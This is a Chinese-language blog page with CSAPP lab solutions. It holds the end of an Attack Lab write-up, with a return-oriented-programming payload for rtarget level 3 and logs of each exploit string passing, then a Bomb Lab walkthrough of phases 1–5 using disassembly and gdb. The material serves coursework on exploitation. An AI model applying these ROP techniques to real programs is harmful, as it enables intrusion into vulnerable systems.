<h3 id="Level-3-1"><a href="#Level-3-1" class="headerlink" title="Level 3"></a>Level 3</h3><p>与之前的 <code>level 3</code> 相同，需要将 <code>%rdi</code> 指向 <code>cookie</code> 的字符串表示的首地址。我们需要把 <code>cookie</code> 字符串放在高地址，根据 <code>%rsp</code> 和偏移量去取地址。<br>在 <code>farm.s</code> 中：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0000000000000042 &lt;add_xy&gt;:</span><br><span class="line">  42:	48 8d 04 37          	lea    (%rdi,%rsi,1),%rax</span><br><span class="line">  46:	c3                   	retq   </span><br></pre></td></tr></table></figure>
<p><code>lea (%rdi,%rsi,1) %rax</code> 就是 <code>%rax = %rdi + %rsi</code>，所以，只要能够让 <code>%rdi</code> 和 <code>%rsi</code> 其中一个保存 <code>%rsp</code>，另一个保存偏移量，就可以计算出 <code>cookie</code> 存放的地址，然后 <code>movq %rax,%rdi</code> 再调用 <code>touch3</code> 就可以了。<br>所以，分两步走：先保存一个栈顶地址，这里我通过 <code>%rsp -&gt; %rax -&gt; %rdi</code> 保存到 <code>%rdi</code> 中，再将偏移量通过 <code>%eax(%rax) -&gt; %ecx -&gt; %edx -&gt; %esi</code> 保存到 <code>%esi(%rsi)</code> 中。注意，偏移量的值需要等所有指令写完后才能确定。<br><code>level 3(rtarget)</code> 最终结果为：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">00 00 00 00 00 00 00 00 </span><br><span class="line">1e 19 40 00 00 00 00 00 &#x2F;* movq %rsp,%rax (48 89 e0) *&#x2F;</span><br><span class="line">e1 18 40 00 00 00 00 00 &#x2F;* movq %rax,%rdi (48 89 c7) *&#x2F;</span><br><span class="line">cf 18 40 00 00 00 00 00 &#x2F;* popq %rax (58) *&#x2F;</span><br><span class="line">&#x2F;* %rdi中保存的是 movq %rsp,%rax 这条指令的栈顶地址，所以最终偏移量为 0x48 *&#x2F;</span><br><span class="line">48 00 00 00 00 00 00 00 &#x2F;* 偏移量 *&#x2F;</span><br><span class="line">58 19 40 00 00 00 00 00 &#x2F;* movl %eax,%ecx (89 c1) *&#x2F;</span><br><span class="line">7a 19 40 00 00 00 00 00 &#x2F;* movl %ecx,%edx (89 ca) *&#x2F;</span><br><span class="line">0c 19 40 00 00 00 00 00 &#x2F;* movl %edx,%esi (89 d6) *&#x2F;</span><br><span class="line">f3 18 40 00 00 00 00 00 &#x2F;* add_xy *&#x2F;</span><br><span class="line">e1 18 40 00 00 00 00 00 &#x2F;* movq %rax,%rdi (48 89 c7) *&#x2F;</span><br><span class="line">29 18 40 00 00 00 00 00 &#x2F;* touch3地址 *&#x2F;</span><br><span class="line">32 61 32 65 34 61 30 38 &#x2F;* 目标字符串 *&#x2F;</span><br></pre></td></tr></table></figure>

<h2 id="最终结果"><a href="#最终结果" class="headerlink" title="最终结果"></a>最终结果</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">[root@iZbp10zyqxzc2aoa1tgk8iZ target53]# .&#x2F;hex2raw &lt; 2017302580193-ctarget.l1 | .&#x2F;ctarget</span><br><span class="line">Cookie: 0x2a2e4a08</span><br><span class="line">Type string:Touch1!: You called touch1()</span><br><span class="line">Valid solution for level 1 with target ctarget</span><br><span class="line">PASS: Sent exploit string to server to be validated.</span><br><span class="line">NICE JOB!</span><br><span class="line">[root@iZbp10zyqxzc2aoa1tgk8iZ target53]# .&#x2F;hex2raw &lt; 2017302580193-ctarget.l2 | .&#x2F;ctarget</span><br><span class="line">Cookie: 0x2a2e4a08</span><br><span class="line">Type string:Touch2!: You called touch2(0x2a2e4a08)</span><br><span class="line">Valid solution for level 2 with target ctarget</span><br><span class="line">PASS: Sent exploit string to server to be validated.</span><br><span class="line">NICE JOB!</span><br><span class="line">[root@iZbp10zyqxzc2aoa1tgk8iZ target53]# .&#x2F;hex2raw &lt; 2017302580193-ctarget.l3 | .&#x2F;ctarget</span><br><span class="line">Cookie: 0x2a2e4a08</span><br><span class="line">Type string:Touch3!: You called touch3(&quot;2a2e4a08&quot;)</span><br><span class="line">Valid solution for level 3 with target ctarget</span><br><span class="line">PASS: Sent exploit string to server to be validated.</span><br><span class="line">NICE JOB!</span><br><span class="line">[root@iZbp10zyqxzc2aoa1tgk8iZ target53]# .&#x2F;hex2raw &lt; 2017302580193-rtarget.l1 | .&#x2F;rtarget</span><br><span class="line">Cookie: 0x2a2e4a08</span><br><span class="line">Type string:Touch2!: You called touch2(0x2a2e4a08)</span><br><span class="line">Valid solution for level 2 with target rtarget</span><br><span class="line">PASS: Sent exploit string to server to be validated.</span><br><span class="line">NICE JOB!</span><br><span class="line">[root@iZbp10zyqxzc2aoa1tgk8iZ target53]# .&#x2F;hex2raw &lt; 2017302580193-rtarget.l2 | .&#x2F;rtarget</span><br><span class="line">Cookie: 0x2a2e4a08</span><br><span class="line">Type string:Touch3!: You called touch3(&quot;2a2e4a08&quot;)</span><br><span class="line">Valid solution for level 3 with target rtarget</span><br><span class="line">PASS: Sent exploit string to server to be validated.</span><br><span class="line">NICE JOB!</span><br></pre></td></tr></table></figure>
<h2 id="repo"><a href="#repo" class="headerlink" title="repo"></a>repo</h2><p><a target="_blank" rel="noopener" href="https://github.com/hey-kong/csapp">My solutions to CSAPP labs</a></p>
</div></article></div><div class="card"><article class="card-content article" role="article"><div class="article-meta is-size-7 is-uppercase level is-mobile"><div class="level-left"><span class="level-item"><time dateTime="2021-01-21T00:00:00.000Z" title="2021-1-21 08:00:00">2021-01-21</time>发表</span><span class="level-item"><time dateTime="2021-01-21T07:54:11.749Z" title="2021-1-21 15:54:11">2021-01-21</time>更新</span><span class="level-item">16 分钟读完 (大约2468个字)</span></div></div><h1 class="title is-3 is-size-4-mobile"><a class="link-muted" href="/2021/01/21/Bomb-Lab/">Bomb Lab</a></h1><div class="content"><p><code>本文记录 CSAPP 的 Bomb Lab 完成方案。</code></p>
<h2 id="bomb-1"><a href="#bomb-1" class="headerlink" title="bomb 1"></a>bomb 1</h2><p>在 <code>phase_1</code> 中， 调用 <code>strings_not_equal</code> 函数：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">000000000000140f &lt;phase_1&gt;:</span><br><span class="line">    140f:	48 83 ec 08          	sub    $0x8,%rsp</span><br><span class="line">    1413:	48 8d 35 36 1d 00 00 	lea    0x1d36(%rip),%rsi        # 3150 &lt;_IO_stdin_used+0x150&gt;</span><br><span class="line">    141a:	e8 f0 04 00 00       	callq  190f &lt;strings_not_equal&gt;</span><br><span class="line">    141f:	85 c0                	test   %eax,%eax</span><br><span class="line">    1421:	75 05                	jne    1428 &lt;phase_1+0x19&gt;</span><br><span class="line">    1423:	48 83 c4 08          	add    $0x8,%rsp</span><br><span class="line">    1427:	c3                   	retq   </span><br><span class="line">    1428:	e8 ee 05 00 00       	callq  1a1b &lt;explode_bomb&gt;</span><br><span class="line">    142d:	eb f4                	jmp    1423 &lt;phase_1+0x14&gt;</span><br></pre></td></tr></table></figure>
<p>如果字符串不相等，函数返回 1，<code>jne</code> 指令发生跳转，进入 <code>explode_bomb</code> 函数；如果字符串相等的话，函数返回 0，<code>jne</code> 指令不发生跳转，直接退出。<br><code>strings_not_equal</code> 函数有两个参数，分别为<code>%rdi</code>和<code>%rsi</code>: </p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">000000000000190f &lt;strings_not_equal&gt;:</span><br><span class="line">    190f:	41 54                	push   %r12</span><br><span class="line">    1911:	55                   	push   %rbp</span><br><span class="line">    1912:	53                   	push   %rbx</span><br><span class="line">    1913:	48 89 fb             	mov    %rdi,%rbx</span><br><span class="line">    1916:	48 89 f5             	mov    %rsi,%rbp</span><br><span class="line">    1919:	e8 d4 ff ff ff       	callq  18f2 &lt;string_length&gt;</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>
<p>一个参数为字符串输入，另一个参数由 <code>phase_1</code> 传入。因此，用 <code>gdb</code> 在 <code>strings_not_equal</code> 处进行断点调试，便可得出答案：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">(gdb) break strings_not_equal</span><br><span class="line">Breakpoint 1 at 0x190f</span><br><span class="line">(gdb) run</span><br><span class="line">Starting program: &#x2F;mnt&#x2F;c&#x2F;ubuntu&#x2F;bomb65&#x2F;bomb </span><br><span class="line">Welcome to my fiendish little bomb. You have 6 phases with</span><br><span class="line">which to blow yourself up. Have a nice day!</span><br><span class="line">test</span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x000000000800190f in strings_not_equal ()</span><br><span class="line">(gdb) p (char*)$rdi</span><br><span class="line">$1 &#x3D; 0x80056a0 &lt;input_strings&gt; &quot;test&quot;</span><br><span class="line">(gdb) p (char*)$rsi</span><br><span class="line">$2 &#x3D; 0x8003150 &quot;I am just a renegade hockey mom.&quot;</span><br></pre></td></tr></table></figure>
<p>第一关答案为 <code>I am just a renegade hockey mom.</code> 。</p>
<h2 id="bomb-2"><a href="#bomb-2" class="headerlink" title="bomb 2"></a>bomb 2</h2><p>直接看 <code>phase_2</code>：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">000000000000142f &lt;phase_2&gt;:</span><br><span class="line">    ...</span><br><span class="line">    143e:	48 89 44 24 18       	mov    %rax,0x18(%rsp)</span><br><span class="line">    1443:	31 c0                	xor    %eax,%eax</span><br><span class="line">    1445:	48 89 e6             	mov    %rsp,%rsi</span><br><span class="line">    1448:	e8 f4 05 00 00       	callq  1a41 &lt;read_six_numbers&gt;</span><br><span class="line">    144d:	83 3c 24 00          	cmpl   $0x0,(%rsp)              -&gt; arr[0] &#x3D; 0</span><br><span class="line">    1451:	75 07                	jne    145a &lt;phase_2+0x2b&gt;</span><br><span class="line">    1453:	83 7c 24 04 01       	cmpl   $0x1,0x4(%rsp)           -&gt; arr[1] &#x3D; 1</span><br><span class="line">    1458:	74 05                	je     145f &lt;phase_2+0x30&gt;</span><br><span class="line">    145a:	e8 bc 05 00 00       	callq  1a1b &lt;explode_bomb&gt;</span><br><span class="line">    145f:	48 89 e3             	mov    %rsp,%rbx                -&gt; %rbx &#x3D; arr[0]</span><br><span class="line">    1462:	48 8d 6b 10          	lea    0x10(%rbx),%rbp          -&gt; %rbp &#x3D; arr[4]</span><br><span class="line">    1466:	eb 0e                	jmp    1476 &lt;phase_2+0x47&gt;</span><br><span class="line">    1468:	e8 ae 05 00 00       	callq  1a1b &lt;explode_bomb&gt;</span><br><span class="line">    146d:	48 83 c3 04          	add    $0x4,%rbx                -&gt; %rbx &#x3D; arr[1]</span><br><span class="line">    1471:	48 39 eb             	cmp    %rbp,%rbx                -&gt; if (%rbx &#x3D;&#x3D; arr[4])</span><br><span class="line">    1474:	74 0c                	je     1482 &lt;phase_2+0x53&gt;</span><br><span class="line">    1476:	8b 43 04             	mov    0x4(%rbx),%eax           -&gt; %eax &#x3D; arr[1]</span><br><span class="line">    1479:	03 03                	add    (%rbx),%eax              -&gt; %eax &#x3D; arr[0] + arr[1]</span><br><span class="line">    147b:	39 43 08             	cmp    %eax,0x8(%rbx)           -&gt; if (%eax &#x3D;&#x3D; arr[2])</span><br><span class="line">    147e:	74 ed                	je     146d &lt;phase_2+0x3e&gt;</span><br><span class="line">    1480:	eb e6                	jmp    1468 &lt;phase_2+0x39&gt;</span><br><span class="line">    1482:	48 8b 44 24 18       	mov    0x18(%rsp),%rax</span><br><span class="line">    1487:	64 48 33 04 25 28 00 	xor    %fs:0x28,%rax</span><br><span class="line">    ...</span><br></pre></td></tr></table></figure>
<p>在 <code>147b</code> 处，若 <code>arr[2] = arr[0] + arr[1]</code>，则函数继续跳转到 <code>146d</code> 处执行，这时 <code>%rbx</code> 的保存的地址由 <code>arr[0]</code> 变为 <code>arr[1]</code>，接下来判断 <code>arr[3], arr[4]</code>……直到 <code>%rbx == arr[4]</code>，也就是判断完了 <code>arr[5]</code> 后停止。因此可以得出，这 6 个数由前两项分别为 0 和 1 的斐波拉契数列组成。第二关答案为 <code>0 1 1 2 3 5</code> 。</p>
<h2 id="bomb-3"><a href="#bomb-3" class="headerlink" title="bomb 3"></a>bomb 3</h2><p>在 <code>phase_3</code> 中：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">14c1:	e8 5a fc ff ff       	callq  1120 &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line">14c6:	83 f8 01             	cmp    $0x1,%eax</span><br></pre></td></tr></table></figure>
<p>在 <code>14c6</code> 处打断点，输入多个数后，打印 <code>%eax</code> 中的值：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(gdb) i r eax</span><br><span class="line">eax            0x2      2</span><br></pre></td></tr></table></figure>
<p>可以判断，在 <code>phase_3</code> 中，我们需要输入两个数。再观察以下代码：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">14cb:	83 3c 24 07          	cmpl   $0x7,(%rsp)</span><br><span class="line">14cf:	77 4b                	ja     151c &lt;phase_3+0x7e&gt;</span><br></pre></td></tr></table></figure>
<p>我们输入的第一个数不能大于 7。再向下看：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">14db:	48 63 04 82          	movslq (%rdx,%rax,4),%rax</span><br><span class="line">14df:	48 01 d0             	add    %rdx,%rax</span><br><span class="line">14e2:	ff e0                	jmpq   *%rax</span><br><span class="line">14e4:	e8 32 05 00 00       	callq  1a1b &lt;explode_bomb&gt;</span><br><span class="line">14e9:	eb e0                	jmp    14cb &lt;phase_3+0x2d&gt;</span><br><span class="line">14eb:	b8 ab 00 00 00       	mov    $0xab,%eax</span><br><span class="line">14f0:	eb 3b                	jmp    152d &lt;phase_3+0x8f&gt;</span><br><span class="line">14f2:	b8 ea 01 00 00       	mov    $0x1ea,%eax</span><br><span class="line">14f7:	eb 34                	jmp    152d &lt;phase_3+0x8f&gt;</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">152d:	39 44 24 04          	cmp    %eax,0x4(%rsp)</span><br><span class="line">1531:	75 15                	jne    1548 &lt;phase_3+0xaa&gt;</span><br><span class="line">1533:	48 8b 44 24 08       	mov    0x8(%rsp),%rax</span><br><span class="line">1538:	64 48 33 04 25 28 00 	xor    %fs:0x28,%rax</span><br><span class="line">153f:	00 00 </span><br><span class="line">1541:	75 0c                	jne    154f &lt;phase_3+0xb1&gt;</span><br><span class="line">1543:	48 83 c4 18          	add    $0x18,%rsp</span><br><span class="line">1547:	c3                   	retq   </span><br><span class="line">1548:	e8 ce 04 00 00       	callq  1a1b &lt;explode_bomb&gt;</span><br><span class="line">154d:	eb e4                	jmp    1533 &lt;phase_3+0x95&gt;</span><br><span class="line">154f:	e8 2c fb ff ff       	callq  1080 &lt;__stack_chk_fail@plt&gt;</span><br></pre></td></tr></table></figure>
<p>可以看到这是 switch 的特征，根据 <code>%rax</code> 中的地址进行跳转，跳转后将数存入 <code>%eax</code> 中， 再跳入 <code>152d</code> 处将数与输入的第二个参数进行比较，如果不相等则触发炸弹爆炸。<br>在这里我输入的第一个参数为 <code>1</code>，用 <code>gdb</code> 调试，查看 <code>%rax</code> 存储的地址：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">(gdb) i r rax</span><br><span class="line">rax            0x80014eb        134223083</span><br></pre></td></tr></table></figure>
<p>这里将跳转至 <code>14eb</code> 处，即输入的第二个参数应该是 <code>0xab</code>，才不会发生爆炸。因此，第三关答案为 <code>1 171</code> (答案不唯一)。</p>
<h2 id="bomb-4"><a href="#bomb-4" class="headerlink" title="bomb 4"></a>bomb 4</h2><p>和 <code>phase_3</code> 一样，接收两个参数：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">15b9:	83 f8 02             	cmp    $0x2,%eax</span><br><span class="line">15bc:	75 06                	jne    15c4 &lt;phase_4+0x33&gt;</span><br></pre></td></tr></table></figure>
<p>并且第一个参数不能大于 15：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">15be:	83 3c 24 0e          	cmpl   $0xe,(%rsp)</span><br><span class="line">15c2:	76 05                	jbe    15c9 &lt;phase_4+0x38&gt;</span><br></pre></td></tr></table></figure>
<p><code>func4</code> 的返回值必须要等于 3，并且第二个参数也要等于 3，负责触发炸弹爆炸：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">15c9:	ba 0e 00 00 00       	mov    $0xe,%edx</span><br><span class="line">15ce:	be 00 00 00 00       	mov    $0x0,%esi</span><br><span class="line">15d3:	8b 3c 24             	mov    (%rsp),%edi</span><br><span class="line">15d6:	e8 79 ff ff ff       	callq  1554 &lt;func4&gt;</span><br><span class="line">15db:	83 f8 03             	cmp    $0x3,%eax</span><br><span class="line">15de:	75 07                	jne    15e7 &lt;phase_4+0x56&gt;</span><br><span class="line">15e0:	83 7c 24 04 03       	cmpl   $0x3,0x4(%rsp)</span><br><span class="line">15e5:	74 05                	je     15ec &lt;phase_4+0x5b&gt;</span><br><span class="line">15e7:	e8 2f 04 00 00       	callq  1a1b &lt;explode_bomb&gt;</span><br><span class="line">15ec:	48 8b 44 24 08       	mov    0x8(%rsp),%rax</span><br><span class="line">15f1:	64 48 33 04 25 28 00 	xor    %fs:0x28,%rax</span><br></pre></td></tr></table></figure>
<p>再看看 <code>func4</code>：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">0000000000001554 &lt;func4&gt;:</span><br><span class="line">    1554:	48 83 ec 08          	sub    $0x8,%rsp</span><br><span class="line">    1558:	89 d0                	mov    %edx,%eax</span><br><span class="line">    155a:	29 f0                	sub    %esi,%eax</span><br><span class="line">    155c:	89 c1                	mov    %eax,%ecx</span><br><span class="line">    155e:	c1 e9 1f             	shr    $0x1f,%ecx</span><br><span class="line">    1561:	01 c1                	add    %eax,%ecx</span><br><span class="line">    1563:	d1 f9                	sar    %ecx</span><br><span class="line">    1565:	01 f1                	add    %esi,%ecx</span><br><span class="line">    1567:	39 f9                	cmp    %edi,%ecx</span><br><span class="line">    1569:	7f 0c                	jg     1577 &lt;func4+0x23&gt;</span><br><span class="line">    156b:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">    1570:	7c 11                	jl     1583 &lt;func4+0x2f&gt;</span><br><span class="line">    1572:	48 83 c4 08          	add    $0x8,%rsp</span><br><span class="line">    1576:	c3                   	retq   </span><br><span class="line">    1577:	8d 51 ff             	lea    -0x1(%rcx),%edx</span><br><span class="line">    157a:	e8 d5 ff ff ff       	callq  1554 &lt;func4&gt;</span><br><span class="line">    157f:	01 c0                	add    %eax,%eax</span><br><span class="line">    1581:	eb ef                	jmp    1572 &lt;func4+0x1e&gt;</span><br><span class="line">    1583:	8d 71 01             	lea    0x1(%rcx),%esi</span><br><span class="line">    1586:	e8 c9 ff ff ff       	callq  1554 &lt;func4&gt;</span><br><span class="line">    158b:	8d 44 00 01          	lea    0x1(%rax,%rax,1),%eax</span><br><span class="line">    158f:	eb e1                	jmp    1572 &lt;func4+0x1e&gt;</span><br></pre></td></tr></table></figure>
<p>说几个值得注意的点：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">155a:	29 f0                	sub    %esi,%eax</span><br><span class="line">155c:	89 c1                	mov    %eax,%ecx</span><br><span class="line">155e:	c1 e9 1f             	shr    $0x1f,%ecx</span><br><span class="line">1561:	01 c1                	add    %eax,%ecx</span><br><span class="line">1563:	d1 f9                	sar    %ecx</span><br><span class="line">1565:	01 f1                	add    %esi,%ecx</span><br></pre></td></tr></table></figure>
<p>这几行的意思是，如果 <code>%eax</code> &lt; <code>%esi</code> 的话，<code>%ecx = (%eax - %esi + 1) / 2 + %esi = (%eax + %esi + 1) / 2</code>，否则 <code>%ecx = (%eax + %esi) / 2</code>。接下来再看：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1567:	39 f9                	cmp    %edi,%ecx</span><br><span class="line">1569:	7f 0c                	jg     1577 &lt;func4+0x23&gt;</span><br><span class="line">156b:	b8 00 00 00 00       	mov    $0x0,%eax</span><br><span class="line">1570:	7c 11                	jl     1583 &lt;func4+0x2f&gt;</span><br><span class="line">1572:	48 83 c4 08          	add    $0x8,%rsp</span><br></pre></td></tr></table></figure>
<p>只有当 <code>%edi = %ecx</code> 时，函数才会退出。最后再看：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">1577:	8d 51 ff             	lea    -0x1(%rcx),%edx</span><br><span class="line">157a:	e8 d5 ff ff ff       	callq  1554 &lt;func4&gt;</span><br><span class="line">157f:	01 c0                	add    %eax,%eax</span><br><span class="line">1581:	eb ef                	jmp    1572 &lt;func4+0x1e&gt;</span><br><span class="line">1583:	8d 71 01             	lea    0x1(%rcx),%esi</span><br><span class="line">1586:	e8 c9 ff ff ff       	callq  1554 &lt;func4&gt;</span><br><span class="line">158b:	8d 44 00 01          	lea    0x1(%rax,%rax,1),%eax</span><br><span class="line">158f:	eb e1                	jmp    1572 &lt;func4+0x1e&gt;</span><br></pre></td></tr></table></figure>
<p>这段代码也就是修改 <code>%rcx</code> 的值，传递参数，递归调用。整个 <code>func4</code> 汇编代码用 Python 表示可以是：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">def func4(a, c, d):</span><br><span class="line">    if d &lt; c:</span><br><span class="line">        b &#x3D; (d + c + 1) &#x2F; 2</span><br><span class="line">    else:</span><br><span class="line">        b &#x3D; (d + c) &#x2F; 2</span><br><span class="line">    </span><br><span class="line">    if b &lt; a:</span><br><span class="line">        return func4(a, b+1, d)*2 + 1</span><br><span class="line">    if b &gt; a:</span><br><span class="line">        return func4(a, c, b-1)*2</span><br><span class="line">    else:</span><br><span class="line">        return 0</span><br></pre></td></tr></table></figure>
<p>因此，第四关答案为 <code>13 3</code> 或者 <code>12 3</code>。</p>
<h2 id="bomb-5"><a href="#bomb-5" class="headerlink" title="bomb 5"></a>bomb 5</h2><p>与 <code>phase_3</code> 类似，首先我们知道输入的数至少有2个：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1629:	e8 f2 fa ff ff       	callq  1120 &lt;__isoc99_sscanf@plt&gt;</span><br><span class="line">162e:	83 f8 01             	cmp    $0x1,%eax</span><br><span class="line">1631:	7e 5a                	jle    168d &lt;phase_5+0x87&gt;</span><br></pre></td></tr></table></figure>
<p>然后我们输入的一个参数的二进制后四位不能为1111(15)：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">1633:	8b 04 24             	mov    (%rsp),%eax</span><br><span class="line">1636:	83 e0 0f             	and    $0xf,%eax</span><br><span class="line">1639:	89 04 24             	mov    %eax,(%rsp)</span><br><span class="line">163c:	83 f8 0f             	cmp    $0xf,%eax</span><br><span class="line">163f:	74 32                	je     1673 &lt;phase_5+0x6d&gt;</span><br></pre></td></tr></table></figure>
<p>接下来分析数组，用 <code>gdb</code> 调试：</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(gdb) p&#x2F;x *(int *)($rsi)@100</span><br><span class="line">$1 &#x3D; &#123;0xa, 0x2, 0xe, 0x7, 0x8, 0xc, 0xf, 0xb, 0x0, 0x4, 0x1, 0xd, 0x3, 0x9, 0x6, 0x5, 0x79206f53, ......&#125;</span><br><span class="line">(gdb) p *$rsi@16</span><br><span class="line">$2 &#x3D; &#123;10, 2, 14, 7, 8, 12, 15, 11, 0, 4, 1, 13, 3, 9, 6, 5&#125;</span><br></pre></td></tr></table></figure>
